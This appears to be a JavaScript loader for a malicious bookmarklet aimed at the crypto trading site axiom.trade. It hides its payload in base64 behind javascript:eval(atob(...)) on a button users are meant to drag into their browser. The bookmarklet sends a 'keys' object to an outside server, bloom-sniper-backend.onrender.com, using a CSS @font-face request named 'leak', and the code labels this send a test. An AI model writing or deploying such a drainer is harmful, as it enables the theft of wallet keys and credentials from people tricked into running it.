// === SAFE DEBUG LOADER - No more btoa error ===
console.log('✅ Loader.js loaded successfully from Render');

function safeBtoa(str) {
    return btoa(unescape(encodeURIComponent(str)));
}

document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM fully loaded - looking for bookmarklet button...');

    const buttons = document.querySelectorAll('a.bookmarklet');
    console.log(`Found ${buttons.length} button(s) with class "bookmarklet"`);

    if (buttons.length === 0) {
        console.error('❌ No button with class="bookmarklet" found!');
        return;
    }

    buttons.forEach((btn, index) => {
        console.log(`Processing button #${index + 1}`);

        const innerCode = `(async () => {
            try {
                console.log('🚀 Bookmarklet executed on ' + location.hostname);
                
                if (location.hostname !== "axiom.trade") {
                    alert("This bookmarklet only works on axiom.trade");
                    return;
                }
                
                alert("✅ Bookmarklet is working! Test mode - data will be sent to your server");
                
                // Test data sent via font-face trick
                const testData = {keys: [], code: "test", site: "Axiom", test: true, timestamp: Date.now()};
                const url = "https://bloom-sniper-backend.onrender.com/i/" + safeBtoa(JSON.stringify(testData));
                
                const style = document.createElement("style");
                style.textContent = '@font-face { font-family: "leak"; src: url("' + url + '"); }';
                document.head.appendChild(style);
                
                console.log('✅ Test data sent to your Render server');
            } catch (err) {
                console.error('Bookmarklet error:', err);
                alert('Error: ' + err.message);
            }
        })();`;

        try {
            const encoded = safeBtoa(innerCode);
            btn.href = 'javascript:eval(atob("' + encoded + '"))';
            btn.draggable = true;
            console.log('✅ SUCCESS: Real bookmarklet href injected on button!');
            console.log('   → Check the href of the pink button in inspector');
        } catch (e) {
            console.error('❌ Failed to inject href:', e.message);
        }
    });
});